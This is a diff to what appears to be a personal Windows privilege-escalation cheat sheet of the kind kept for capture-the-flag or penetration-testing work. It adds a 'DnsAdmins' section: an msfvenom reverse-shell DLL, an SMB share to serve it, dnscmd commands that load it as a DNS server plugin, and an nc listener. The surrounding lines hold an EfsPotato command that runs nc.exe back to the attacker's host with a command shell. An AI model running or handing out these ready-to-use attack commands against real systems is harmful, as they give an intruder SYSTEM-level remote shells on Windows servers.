@@ -1197,6 +1197,12 @@ robocopy /b \users\administrator\desktop\ .; type \users\administrator\desktop\r
 echo -e 'type \\users\\administrator\\desktop\\root.txt' | rlwrap nc -lvnp 5566
 C:\programdata\EfsPotato.exe "C:\programdata\nc.exe $MYIP 5566 -e cmd"
 
++---------- DnsAdmins ----------+
+rlwrap nc -lvnp 5555
+impacket-smbserver share .
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o 0.dll
+dnscmd.exe /config /serverlevelplugindll \\$MYIP\share\0.dll
+
 +---------- Initial Checks ----------+
 Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publishe
 Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.Publisher -and $_.Publisher -notlike "*Microsoft*" } | Select-Object DisplayName, DisplayVersion, Publisher
